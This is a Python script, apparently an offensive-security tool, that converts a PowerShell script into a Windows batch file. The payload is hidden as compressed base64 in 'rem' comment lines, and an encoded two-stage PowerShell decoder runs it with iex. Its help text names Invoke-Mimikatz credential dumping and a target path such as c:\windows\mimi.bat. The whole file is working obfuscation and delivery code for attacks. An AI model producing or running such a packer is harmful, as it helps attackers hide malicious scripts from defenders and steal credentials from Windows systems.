#!/usr/bin/python
import zlib
import base64
import argparse
import os.path

ps1_comment_decoder_stage1 = "$file = Get-Content '{}'\r\nforeach ($line in $file)\r\n{{\r\n    if ($line.Substring(0,3) -eq 'rem')\r\n    {{\r\n        $result = $result + $line.Substring(4)\r\n    }}    \r\n}}\r\nsal a New-Object \r\niex (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($result),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()\r\nexit"

ps1_comment_decoder_stage2 = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('{}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"


end_blob = 'IF EXIST %SystemRoot%\\sysnative\WindowsPowerShell\\v1.0\\ (set "ps=%SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\")\r\nIF NOT EXIST %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\ (set "ps=")\r\n%ps%powershell.exe -NoP -NonI -E "{}"'

bat_str_len = 2005


def deflate_and_base64_encode( string_val ):
    zlibbed_str = zlib.compress( string_val )
    compressed_string = zlibbed_str[2:-4]
    return base64.b64encode( compressed_string )

def gen_comment_block(ps1_buf):
	n = bat_str_len
	lines = [ps1_buf[i:i+n] for i in range(0, len(ps1_buf), n)]	
	res = '@echo off\r\n'
	for line in lines:
		res += 'rem ' + line + '\r\n'
	return res

def generate_b64_oneliner(ps1_buf):
	return base64.b64encode(ps1_buf.encode('utf-16')[2:])


def main():
	parser = argparse.ArgumentParser(description='Generate bat file from powershell script')
	parser.add_argument('--script-path', dest='script_path', action='store', help='path to powershell script. ex Invoke-Mimikatz.ps1', required=True)
	parser.add_argument('--target-filepath', dest='target_filepath', action='store', help='path to bat file on target system. ex c:\\windows\\mimi.bat', default='c:\\windows\\script.bat')
	parser.add_argument('--launch-string', dest='launch_string', action='store', help='powershell command to append to script. ex Invoke-Mimikatz -dumpcred')
	parser.add_argument('--out', dest='out', action='store', help='filename to write payload to')

	args = parser.parse_args()
	
	encoded_stage1 = ps1_comment_decoder_stage1.format(args.target_filepath)
	encoded_stage2 = ps1_comment_decoder_stage2.format(deflate_and_base64_encode(encoded_stage1))
	encoded_enb_blob = end_blob.format(generate_b64_oneliner(encoded_stage2))

	powershell_script = open(args.script_path).read()

	if args.launch_string is not None:
		powershell_script += '\r\n' + args.launch_string

	res = gen_comment_block(deflate_and_base64_encode(powershell_script)) + encoded_enb_blob

	if args.out is None:
		print res
	else:
		with open(args.out, 'wb') as f:
			f.write(res)


if __name__ == '__main__':
	main()